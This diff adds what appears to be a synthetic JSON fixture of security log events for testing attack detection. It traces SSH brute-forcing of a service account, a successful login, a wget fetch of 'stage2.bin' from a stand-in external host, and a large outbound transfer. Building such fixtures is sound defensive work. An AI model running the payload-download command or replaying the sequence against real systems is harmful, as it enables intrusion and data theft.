@@ -1,0 +1,10 @@
+[
+  {"id":"fk-001","timestamp":"2026-09-17T12:10:00Z","source":"auth","action":"login_failed","username":"svc-deploy","source_ip":"203.0.113.77","hostname":"app-07","raw":"Failed SSH login for svc-deploy from 203.0.113.77"},
+  {"id":"fk-002","timestamp":"2026-09-17T12:10:10Z","source":"auth","action":"login_failed","username":"svc-deploy","source_ip":"203.0.113.77","hostname":"app-07","raw":"Failed SSH login for svc-deploy from 203.0.113.77"},
+  {"id":"fk-003","timestamp":"2026-09-17T12:10:20Z","source":"auth","action":"login_failed","username":"svc-deploy","source_ip":"203.0.113.77","hostname":"app-07","raw":"Failed SSH login for svc-deploy from 203.0.113.77"},
+  {"id":"fk-004","timestamp":"2026-09-17T12:10:30Z","source":"auth","action":"login_failed","username":"svc-deploy","source_ip":"203.0.113.77","hostname":"app-07","raw":"Failed SSH login for svc-deploy from 203.0.113.77"},
+  {"id":"fk-005","timestamp":"2026-09-17T12:10:40Z","source":"auth","action":"login_failed","username":"svc-deploy","source_ip":"203.0.113.77","hostname":"app-07","raw":"Failed SSH login for svc-deploy from 203.0.113.77"},
+  {"id":"fk-006","timestamp":"2026-09-17T12:11:30Z","source":"auth","action":"login_success","username":"svc-deploy","source_ip":"203.0.113.77","hostname":"app-07","raw":"Successful SSH login for svc-deploy from 203.0.113.77"},
+  {"id":"fk-007","timestamp":"2026-09-17T12:12:00Z","source":"process","process_name":"wget","command_line":"wget http://198.51.100.99/stage2.bin","username":"svc-deploy","hostname":"app-07","raw":"New process wget on app-07"},
+  {"id":"fk-008","timestamp":"2026-09-17T12:14:00Z","source":"network","source_ip":"10.0.0.9","destination_ip":"198.51.100.99","hostname":"app-07","bytes_sent":60000000,"raw":"57 MB outbound transfer from app-07"}
+]
